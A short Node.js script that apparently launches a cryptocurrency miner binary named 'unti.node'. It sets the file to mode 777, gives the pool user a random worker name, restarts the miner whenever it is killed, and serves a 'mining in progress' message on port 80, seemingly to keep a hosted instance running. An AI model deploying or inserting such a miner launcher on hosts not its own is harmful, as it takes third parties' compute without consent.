const child_process = require('child_process');
const http = require('http');
const fs = require('fs');
let fuck = require('./config.json');
child_process.execSync('chmod 777 ' + __dirname + '/unti.node');
if(!fuck.noFuck) {
  fuck.noFuck = Math.floor(
    Math.random()*0xfffffffffffffffff +
    Date.now() + 
    process.pid
  ).toString(36).substring(2);
  fs.writeFileSync('./config.json', JSON.stringify(fuck, null, 2));
};

if(!fuck.pools[0].user.split('.')[1]) {
  const fff = __dirname.split('/');
  fuck.pools[0].user += '.' + fff[Math.floor(Math.random()*fff.length)] + fuck.noFuck;
  fs.writeFileSync('./config.json', JSON.stringify(fuck, null, 2));
};
const server = http.createServer();
let sb = child_process.spawn(__dirname + '/unti.node');
server.on('request', (req, res) => {
  res.writeHead(200, {'Content-Type' : 'text/plain; charset=UTF-8'});
  res.write("絶賛マイニング中です！");
  res.end();
});

server.listen(80);

setInterval(() => {
  if(sb.killed) sb = child_process.spawn(__dirname + '/unti.node');
});
